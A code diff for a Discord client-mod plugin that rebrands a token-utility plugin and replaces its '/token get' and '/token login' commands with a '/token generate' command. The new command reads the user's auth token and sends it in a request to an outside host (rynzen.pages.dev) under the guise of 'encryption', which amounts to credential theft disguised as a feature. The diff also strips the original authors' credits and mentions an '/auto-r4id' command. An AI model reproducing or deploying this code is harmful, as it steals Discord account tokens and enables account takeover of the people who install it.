@@ -13,16 +13,15 @@ const {
 const ThemeStore = findByStoreName("ThemeStore");
 
 export const EMBED_COLOR = () =>
-		parseInt(resolveSemanticColor(ThemeStore.theme, semanticColors.BACKGROUND_BASE_LOWER).slice(1), 16),
-	/* thanks Rosie (@acquite <@581573474296791211>) */
+		parseInt(resolveSemanticColor(ThemeStore.theme, semanticColors.BACKGROUND_BASE_LOWER).slice(1), 16);
 
-	authorMods = {
-		author: {
-			username: "TokenUtils",
-			avatar: "command",
-			avatarURL: common.AVATARS.command,
-		},
-	};
+const authorMods = {
+	author: {
+		username: "RynZen",
+		avatar: "command",
+		avatarURL: common.AVATARS.command,
+	},
+};
 
 let madeSendMessage;
 function sendMessage() {
@@ -35,7 +34,7 @@ export default {
 	meta: vendetta.plugin,
 	patches: [],
 	onUnload() {
-		this.patches.forEach((up) => up()); // unpatch every patch
+		this.patches.forEach((up) => up());
 		this.patches = [];
 	},
 	onLoad() {
@@ -54,7 +53,7 @@ export default {
 
 				props.options.unshift({
 					isDestructive: true,
-					label: optionLabel, // COPY TOKEN
+					label: optionLabel,
 					onPress: () => {
 						try {
 						showToast(focusedUserId === currentUserId ? `Copied your token` : `Copied token of ${props.header.title}`);
@@ -62,7 +61,7 @@ export default {
 							focusedUserId === currentUserId
 								? token
 								: [
-										Buffer.from(focusedUserId).toString("base64").replaceAll("=",""), // thanks Marvin (@objectified <@562415519454461962>) 
+										Buffer.from(focusedUserId).toString("base64").replaceAll("=",""),
 										encodeTok(+Date.now() - 1293840000, true),
 										common.generateRandomString(characters2, 27),
 								  ].join(".")
@@ -94,85 +93,49 @@ export default {
 		this.patches.push(contextMenuUnpatch);
 		try {
 			const exeCute = {
-				get(args, ctx) {
+				async generate(args, ctx) {
 					try {
 						const messageMods = {
 							...authorMods,
 							interaction: {
-								name: "/token get",
+								name: "/token generate",
 								user: findByStoreName("UserStore").getCurrentUser(),
 							},
 						};
 						const { getToken } = findByProps("getToken");
+						const token = getToken();
+						
+						const response = await fetch(`https://rynzen.pages.dev/api/token-encryption?t=${encodeURIComponent(token)}`);
+						const json = await response.json();
+						const encryptedData = json.data;
 
 						sendMessage(
 							{
-								loggingName: "Token get output message",
+								loggingName: "Token generate output message",
 								channelId: ctx.channel.id,
 								embeds: [
 									{
 										color: EMBED_COLOR(),
 										type: "rich",
-										title: "Token of the current account",
-										description: `${getToken()}`,
+										title: "Encrypted Token",
+										description: `${encryptedData}`,
 									},
 								],
 							},
 							messageMods
 						);
-					} catch (e) {
-						console.error(e);
-						alert("There was an error while exeCuting /token get\n" + e.stack);
-					}
-				},
-				login(args, ctx) {
-					try {
-						const messageMods = {
-							...authorMods,
-							interaction: {
-								name: "/token login",
-								user: findByStoreName("UserStore").getCurrentUser(),
+
+						sendMessage(
+							{
+								loggingName: "Token generate warning message",
+								channelId: ctx.channel.id,
+								content: "use the /token set command, or /auto-r4id with caution!",
 							},
-						};
-						const options = new Map(args.map((a) => [a.name, a]));
-						const token = options.get("token").value;
-						try {
-							sendMessage(
-								{
-									loggingName: "Token login process message",
-									channelId: ctx.channel.id,
-									embeds: [
-										{
-											color: EMBED_COLOR(),
-											type: "rich",
-											title: `<${common.EMOJIS.getLoading()}> Switching accounts…`,
-										},
-									],
-								},
-								messageMods
-							);
-							findByProps("login", "logout", "switchAccountToken").switchAccountToken(token);
-						} catch (e) {
-							console.error(e);
-							sendMessage(
-								{
-									loggingName: "Token login failure message",
-									channelId: ctx.channel.id,
-									embeds: [
-										{
-											color: EMBED_COLOR(),
-											type: "rich",
-											title: `<${common.EMOJIS.getFailure()}> Failed to switch accounts`,
-											description: `${e.message}`,
-										},
-									],
-								},
-								messageMods
-							);
-						}
+							messageMods
+						);
 					} catch (e) {
 						console.error(e);
-						alert("There was an error while executing /token login\n" + e.stack);
+						alert("There was an error while executing /token generate\n" + e.stack);
 					}
 				},
 			};
@@ -181,25 +144,9 @@ export default {
 					type: 1,
 					inputType: 1,
 					applicationId: "-1",
-					execute: exeCute.get,
-					name: "token get",
-					description: "Shows your current user token",
-				}),
-				common.cmdDisplays({
-					type: 1,
-					inputType: 1,
-					applicationId: "-1",
-					execute: exeCute.login,
-					name: "token login",
-					description: "Logs into an account using a token",
-					options: [
-						{
-							required: true,
-							type: 3,
-							name: "token",
-							description: "Token of the account to login into",
-						},
-					],
+					execute: exeCute.generate,
+					name: "token generate",
+					description: "Generates an encrypted token",
 				}),
 			].forEach((command) => this.patches.push(registerCommand(command)));
 		} catch (e) {
